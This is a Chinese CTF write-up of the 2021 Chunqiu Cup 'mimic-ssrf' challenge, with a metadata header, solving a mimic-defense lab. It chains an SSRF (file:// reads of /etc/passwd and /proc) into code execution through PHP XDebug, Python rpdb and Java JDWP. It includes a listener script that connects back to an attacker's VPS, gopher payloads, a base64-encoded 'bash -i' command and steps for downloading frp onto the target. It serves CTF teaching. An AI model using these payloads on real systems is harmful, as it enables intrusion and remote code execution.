---
title: 【拟态挑战WP】2021 春秋杯秋季赛 mimic-ssrf
contest: 春秋杯
year: 2021
difficulty: hard
vuln_type: ssrf
tags:
- 拟态防御-mimic-defense
- 邬江兴-紫金山实验室
- SSRF
- file-protocol
- /proc/PID/cmdline
- XDebug-PHP
- python-debugpy
- Java-JDWP
- 多异构体表决
attack_chain: 1. SSRF file:///etc/passwd 读文件 /2. /proc/PID/cmdline 遍历进程找 3 个语言服务 (PHP/Python/Java) /3. PHP XDebug client_port 13000 → 反弹代码执行 /4. Python debugpy + Java JDWP 类似利用 /5. 三种异构体需同时返回一致结果（拟态表决）
key_payload: file:///etc/passwd  /proc/§1§/cmdline  client_port=13000  三个异构体同时执行
one_liner: 2021 春秋杯秋季赛 mimic-ssrf 拟态防御 + SSRF + XDebug/debugpy/JDWP 三语言 RCE 链。
lesson: 拟态防御（mimic defense）= 邬江兴院士 + 紫金山实验室；三语言异构体需一致响应通过表决；SSRF + XDebug 13000 端口是 PHP RCE 经典；debugpy/JDWP 是 Python/Java 对应端口。
quality: high
full_path: 【拟态挑战WP】2021年春秋杯秋季赛mimic-ssrf.full.md
meta_path: 【拟态挑战WP】2021年春秋杯秋季赛mimic-ssrf.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 【拟态挑战WP】2021 春秋杯秋季赛 mimic-ssrf。2021 春秋杯秋季赛 mimic-ssrf 拟态防御 + SSRF + XDebug/debugpy/JDWP 三语言 RCE 链。。经验：拟态防御（mimic defense）= 邬江兴院士 + 紫金山实验室；三语言异构体需一致响应通过表决；SSRF + X...
category: web
subcategory: ssrf
tools_used:
- Java
- PHP
- Python
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/22547.html
reasoning_chain:
- 'ssrf?url=file:///etc/passwd 可读 → 触发点: SSRF 入口 + file 协议'
- '假设: /proc/<pid>/cmdline 能遍历进程 → 动作: 遍历 /proc/§1§/cmdline'
- '观察: 4 个服务, 其中 php/python/java 3 个异构体 + 1 个 web → 三语言拟态'
- 'PHP: 读 php.ini 发现 xdebug.client_port=13000 → 假设: 反连调试端口可 RCE'
- '动作: VPS 开 13000 + gopher 构造 XDEBUG_SESSION_START 请求 → system(''ls /'') → 拿到 shell'
- 'Python: /web/python/app.py 看到 rpdb 远程调试 → 假设: gopher 打 4444 端口'
- '动作: gopher://127.0.0.1:4444/_open(''/tmp/python_flag'',''w'').write(...) → file:// 读 flag'
- 'Java: jdwp-shellifier 打 20211 端口 → String.equals 触发断点 → 写 java_flag → 完成'
failed_attempts:
- '试图对单一语言直接拿 flag → 失败: 拟态表决必须三语言同时返回一致结果'
- '直接用 jdwp-shellifier 不挂代理 → 失败: JDWP 协议需要 socket 隧道, frp 转发才行'
key_observations:
- 拟态防御 (mimic defense) = 邬江兴院士 + 紫金山实验室, 三语言异构体需一致响应过表决
- XDebug client_port 13000 / rpdb 4444 / JDWP 任意端口 = 三语言 RCE 黄金三角
- gopher:// 可构造任意 TCP 原始数据, 是 SSRF 的万能武器
- 拟态 = 多异构体 + 表决, 必须每个异构体都攻破才能拿到一致响应
prerequisites:
- SSRF 基础 (file/gopher/dict 协议)
- XDebug 远程调试命令执行原理 (eval -i 1 -- base64)
- Python rpdb / Java JDWP 远程调试协议
- gopher 协议原始 TCP 包构造 (URL 编码两层)
---
# 【拟态挑战WP】2021年春秋杯秋季赛mimic-ssrf

> 原文: https://www.ctfiot.com/22547.html
> ID: 22547

楔子

本次比赛中，春秋GAME和紫金山实验室合作，借鉴邬江兴院士拟态防御理论设计了mimic-ssrf题目，该题目是个通过ssrf进行RCE的web环境，三种开发语言的debug调试器，代表了三种单异构体。一般黑客的攻击指令只会由一个异构体进行执行反馈，明确的攻击指令会有明确的反馈结果，但是在这道题中选手的攻击指令必须同时让3个异构体反馈一致的结果，不然在拟态的防御机制中，就会被表决失效。

在了解拟态防御理论的同时，对于该技术的应用你有什么问题或建议，欢迎给我们留言。如果有特别有趣的想法或建设性意见，我们会有礼品赠送。

分析

首先解读下题目名，mimic指的是“拟态”，ssrf指的是“由攻击者构造形成由服务端发起请求的安全漏洞”。再由题目描述可知，应该是要通过ssrf暴露远程debug端口，利用三种编程语言的debug调试器进行攻击。

该题以ssrf为入口：

尝试使用file协议读文件ssrf?url=file:///etc/passwd

可以看到成功读到/etc/passwd。

这个时候我们就可以考虑通过对linux下面的proc目录遍历进程，收集有用的信息。

/ssrf?url=file:///proc/§1§/cmdline可以得到大概有四个服务，如下：

根据题目描述可知，本题内网使用了3种语言所搭建的服务，分别php、python和java，接下来就按顺序来分析和利用。

php Xdebug RCE

XDebug是PHP的一个扩展，用于调试PHP代码。

我们访问带有XDEBUG_SESSION_START参数时，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）将debug信息转发到相关客户端的调试端口并且可以执行相关调试函数，即可在目标服务器上执行任意PHP代码。

先读取index.php文件看看有什么信息。

php的http服务里面什么都没有，读取php.ini

可以发现开启了xdebug和相关配置，client_port是13000。

我们可以现在远程vps执行如下

#!/usr/bin/python2
import socket

ip_port = ('0.0.0.0',13000)
sk = socket.socket()
sk.bind(ip_port)
sk.listen(10)
conn, addr = sk.accept()

while True:
    client_data = conn.recv(1024)
    print(client_data)

    data = raw_input('>> ')
    conn.sendall('eval -i 1 -- %sx00' % data.encode('base64'))

通过gopher构造get请求的原始数据

gopher://127.0.0.1:
7410/_GET%2520%252Findex.php%253FXDEBUG_SESSION_START%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A7410%250D%250AUser-Agent%253A%2520curl%252F7.58.0%250D%250AAccept%253A%2520*%252F*%250D%250AX-Forwarded-For%253A%2520ip%250D%250A%250D%250A

vps接着收到了信息；然后可以system("ls / |base64 -w 0")执行任意代码了。

python rpdb RCE

rpdb扩展了pdb，让pdb支持远程调试功能。

使用rpdb的python脚本在远程启动，本地通过telnet方式连接上rpdb提供的调试端口（默认端口4444），可以直接执行python代码。

先读/web/python/app.py

发现使用了远程调试器rpdb。

我们可以直接通过gopher攻击python把flag写入到/tmp/，然后直接通过file协议读取文件。

gopher://127.0.0.1:
4444/_open("/tmp/python_flag","w").write(fl1l1l1l1laaggg)

java JDWP RCE

Java 虚拟机为 Java 语言提供 Java debugger、JDB 调试功能，应用在编译过程中可以开启 Remote Debug 模式，方便程序员远程对代码进行调试。但是，该模式没有身份校验机制，且可执行系统命令

同样先查看源码/web/java/Hello_web.jar

可以发现是触发了String.equals这个函数。

需要做socket代理(直接用frp就行)

远程搭建一个http服务，让容器下载我们的frp的工具，通过php的shell下载文件，搭建socket的通道

然后就是攻击java的debug(jdwp-shellifier.py(https://github.com/IOActive/jdwp-shellifier))，打了之后是卡住的，通过ssrf的接口服务java的web服务即可触发断点

proxychains python jdwp-shellifier.py -t 127.0.0.1 -p 20211 --cmd 'bash -c {echo,Y2F0IC9qYXZhX2ZsYWc+IC90bXAvamF2YV9mbGFn}|{base64,-d}|{bash,-i}' --break-on 'java.lang.String.equals'(proxychains 配置的是自己的socket配置)

最后通过file协议读取java的flag。

GAME福利

为了让更多选手可以回味本次比赛的精彩过程，持续学习和训练，并且可以学习邬江兴院士拟态防御理论，实际体验拟态防御机制的特点，春秋GAME团队将mimic-ssrf题目部署到“伽玛实验场之拟态挑战”，欢迎各位师傅交流讨论。https://www.ichunqiu.com/competition

也欢迎大家到我们和紫金山实验室合作的NEST内生安全实验场中体验真实的拟态设备挑战，为各位大佬们的日常研究和安全工作提供更多经验和借鉴。

https://nest.ichunqiu.com/

相关阅读

【拟态挑战WP】2021年天津市大学生线上初赛mimic-ssti

Writeup | 巅峰极客线上初赛mimic-game


```
#!/usr/bin/python2
import socket

ip_port = ('0.0.0.0',13000)
sk = socket.socket()
sk.bind(ip_port)
sk.listen(10)
conn, addr = sk.accept()

while True:
    client_data = conn.recv(1024)
    print(client_data)

    data = raw_input('>> ')
    conn.sendall('eval -i 1 -- %sx00' % data.encode('base64'))
gopher://127.0.0.1:
7410/_GET%2520%252Findex.php%253FXDEBUG_SESSION_START%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A7410%250D%250AUser-Agent%253A%2520curl%252F7.58.0%250D%250AAccept%253A%2520*%252F*%250D%250AX-Forwarded-For%253A%2520ip%250D%250A%250D%250A
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]